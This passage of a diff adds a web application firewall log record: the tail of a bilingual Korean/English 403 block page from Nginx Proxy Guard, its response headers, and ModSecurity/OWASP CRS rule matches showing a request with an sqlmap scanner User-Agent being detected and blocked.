margin-bottom: 20px; }\n        .error-message { font-size: 16px; color: #a0a0a0; line-height: 1.8; margin-bottom: 30px; }\n        .security-badge {\n            display: inline-flex; align-items: center; gap: 8px;\n            padding: 12px 24px; background: rgba(239, 68, 68, 0.1);\n            border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 50px;\n            color: #ef4444; font-size: 14px; font-weight: 500;\n        }\n        .security-badge svg { width: 18px; height: 18px; }\n        .info-box {\n            margin-top: 40px; padding: 20px; background: rgba(255, 255, 255, 0.03);\n            border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05);\n        }\n        .info-title {\n            font-size: 14px; font-weight: 600; color: #808080;\n            margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px;\n        }\n        .info-text { font-size: 14px; color: #707070; line-height: 1.6; }\n        .back-btn {\n            display: inline-block; margin-top: 30px; padding: 12px 30px;\n            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);\n            color: white; text-decoration: none; border-radius: 8px;\n            font-weight: 500; transition: transform 0.2s, box-shadow 0.2s;\n            cursor: pointer; border: none;\n        }\n        .back-btn:hover {\n            transform: translateY(-2px);\n            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);\n        }\n        .footer { margin-top: 50px; font-size: 12px; color: #505050; }\n        .footer a { color: #707070; text-decoration: none; }\n        .lang-switch {\n            margin-top: 20px; display: flex; justify-content: center; gap: 10px;\n        }\n        .lang-btn {\n            padding: 6px 16px; border-radius: 20px; border: 1px solid #404050;\n            background: transparent; color: #808080; font-size: 12px;\n            cursor: pointer; transition: all 0.2s;\n        }\n        .lang-btn:hover { border-color: #606070; color: #a0a0a0; }\n        .lang-btn.active {\n            background: rgba(59, 130, 246, 0.2); border-color: #3b82f6;\n            color: #3b82f6;\n        }\n        [data-lang=\"en\"] { display: none; }\n        body.en [data-lang=\"ko\"] { display: none; }\n        body.en [data-lang=\"en\"] { display: block; }\n        body.en .error-message[data-lang=\"en\"],\n        body.en .info-text[data-lang=\"en\"] { display: block; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"shield\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n                <path class=\"shield-icon\" d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V8.26l7-3.89v8.62z\"/>\n                <path fill=\"#fff\" opacity=\"0.3\" d=\"M12 12.99V21c-3.72-1.15-6.47-4.82-7-8.94h7z\"/>\n                <line x1=\"8\" y1=\"10\" x2=\"16\" y2=\"10\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n                <line x1=\"12\" y1=\"6\" x2=\"12\" y2=\"14\" stroke=\"#fff\" stroke-width=\"2\" stroke-linecap=\"round\"/>\n            </svg>\n        </div>\n\n        <div class=\"error-code\">403</div>\n\n        <div class=\"error-title\" data-lang=\"ko\">접근이 차단되었습니다</div>\n        <div class=\"error-title\" data-lang=\"en\">Access Blocked</div>\n\n        <div class=\"error-message\" data-lang=\"ko\">\n            보안 정책에 의해 요청이 차단되었습니다.<br>\n            이 보안 조치는 잠재적으로 유해한 요청으로부터 시스템을 보호합니다.\n        </div>\n        <div class=\"error-message\" data-lang=\"en\">\n            Your request has been blocked by the security policy.<br>\n            This security measure protects the system from potentially harmful requests.\n        </div>\n\n        <div class=\"security-badge\">\n            <svg viewBox=\"0 0 24 24\" fill=\"currentColor\">\n                <path d=\"M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z\"/>\n            </svg>\n            <span data-lang=\"ko\">Nginx Proxy Guard 보안 보호</span>\n            <span data-lang=\"en\">Protected by Nginx Proxy Guard</span>\n        </div>\n\n        <div class=\"info-box\">\n            <div class=\"info-title\" data-lang=\"ko\">왜 차단되었나요?</div>\n            <div class=\"info-title\" data-lang=\"en\">Why was I blocked?</div>\n            <div class=\"info-text\" data-lang=\"ko\">\n                요청에 알려진 공격 패턴(SQL 인젝션, XSS, 경로 탐색 등)과 일치하는<br>\n                내용이 포함되어 있습니다. 오류라고 생각되시면 관리자에게 문의해 주세요.\n            </div>\n            <div class=\"info-text\" data-lang=\"en\">\n                The request contained patterns that match known attack signatures<br>\n                (SQL injection, XSS, path traversal, etc.). Contact the administrator if you believe this is a mistake.\n            </div>\n        </div>\n\n        <button class=\"back-btn\" onclick=\"history.back()\">\n            <span data-lang=\"ko\">뒤로 가기</span>\n            <span data-lang=\"en\">Go Back</span>\n        </button>\n\n        <div class=\"footer\">\n            Powered by <a href=\"#\">Nginx Proxy Guard</a>\n        </div>\n\n        <div class=\"lang-switch\">\n            <button class=\"lang-btn active\" onclick=\"setLang('ko')\" id=\"btn-ko\">한국어</button>\n            <button class=\"lang-btn\" onclick=\"setLang('en')\" id=\"btn-en\">English</button>\n        </div>\n    </div>\n\n    <script>\n        function applyLang(lang) {\n            document.documentElement.lang = lang;\n            document.body.className = lang === 'en' ? 'en' : '';\n            document.getElementById('btn-ko').className = 'lang-btn' + (lang === 'ko' ? ' active' : '');\n            document.getElementById('btn-en').className = 'lang-btn' + (lang === 'en' ? ' active' : '');\n        }\n        function setLang(lang) {\n            localStorage.setItem('npg_language', lang);\n            applyLang(lang);\n        }\n        function detectBrowserLang() {\n            var browserLang = (navigator.language || 'en').split('-')[0];\n            return browserLang === 'ko' ? 'ko' : 'en';\n        }\n        // Initial lang resolution (before API):\n        // 1) Prefer the user's saved click — UI Settings writes 'npg_language'; legacy 'npg_lang' kept for back-compat\n        // 2) Else follow browser language\n        // This avoids the Korean flash for non-Korean visitors with no saved preference.\n        var savedLang = localStorage.getItem('npg_language') || localStorage.getItem('npg_lang');\n        var initialLang = (savedLang === 'ko' || savedLang === 'en') ? savedLang : detectBrowserLang();\n        applyLang(initialLang);\n\n        // Load global UI settings (font + admin-configured default error page language)\n        async function loadUISettings() {\n            try {\n                const res = await fetch('/api/v1/public/ui-settings');\n                if (res.ok) {\n                    const data = await res.json();\n                    if (data.font_family && data.font_family !== 'system') {\n                        document.body.setAttribute('data-font', data.font_family);\n                    }\n                    // Admin default only applies when the visitor has no saved preference.\n                    // 'auto' (or missing) means follow browser language.\n                    if (savedLang !== 'ko' && savedLang !== 'en') {\n                        var adminDefault = data.error_page_language;\n                        if (adminDefault === 'ko' || adminDefault === 'en') {\n                            applyLang(adminDefault);\n                        }\n                        // else 'auto' → keep the browser-detected lang already applied.\n                    }\n                    return;\n                }\n            } catch (e) {\n                // API unavailable — fall back to saved font preference if any\n                var savedFont = localStorage.getItem('npg_font_family');\n                if (savedFont && savedFont !== 'system') {\n                    document.body.setAttribute('data-font', savedFont);\n                }\n            }\n        }\n        loadUISettings();\n    </script>\n</body>\n</html>\n",
+        "http_code": 403,
+        "headers": {
+          "X-Frame-Options": "SAMEORIGIN",
+          "ETag": "\"6a0c26a2-2a79\"",
+          "Last-Modified": "Tue, 19 May 2026 09:00:18 GMT",
+          "Vary": "Accept-Encoding",
+          "X-XSS-Protection": "1; mode=block",
+          "Connection": "keep-alive",
+          "X-Content-Type-Options": "nosniff",
+          "Content-Type": "text/html",
+          "Content-Length": "10873",
+          "Date": "Tue, 19 May 2026 09:49:07 GMT",
+          "Server": "nginx\u0000",
+          "Referrer-Policy": "strict-origin-when-cross-origin"
+        }
+      },
+      "producer": {
+        "modsecurity": "ModSecurity v3.0.15 (Linux)",
+        "connector": "ModSecurity-nginx v1.0.4",
+        "secrules_engine": "Enabled",
+        "components": [
+          "OWASP_CRS/4.26.0\""
+        ]
+      },
+      "messages": [
+        {
+          "message": "Found User-Agent associated with security scanner",
+          "details": {
+            "match": "Matched \"Operator `PmFromFile' with parameter `scanners-user-agents.data' against variable `REQUEST_HEADERS:User-Agent' (Value: `sqlmap/1.5.2#stable' )",
+            "reference": "o0,6v85,19",
+            "ruleId": "913100",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-913-SCANNER-DETECTION.conf",
+            "lineNumber": "38",
+            "data": "Matched Data: sqlmap found within REQUEST_HEADERS:User-Agent: sqlmap/1.5.2#stable",
+            "severity": "2",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "application-multi",
+              "language-multi",
+              "platform-multi",
+              "attack-reputation-scanner",
+              "paranoia-level/1",
+              "OWASP_CRS",
+              "OWASP_CRS/SCANNER-DETECTION",
+              "capec/1000/118/224/541/310"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        },
+        {
+          "message": "Inbound Anomaly Score Exceeded (Total Score: 5)",
+          "details": {
+            "match": "Matched \"Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `5' )",
+            "reference": "",
+            "ruleId": "949110",
+            "file": "/etc/nginx/owasp-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf",
+            "lineNumber": "222",
+            "data": "",
+            "severity": "0",
+            "ver": "OWASP_CRS/4.26.0",
+            "rev": "",
+            "tags": [
+              "anomaly-evaluation",
+              "OWASP_CRS"
+            ],
+            "maturity": "0",
+            "accuracy": "0"
+          }
+        }
+      ]
+    }
+  }
+]
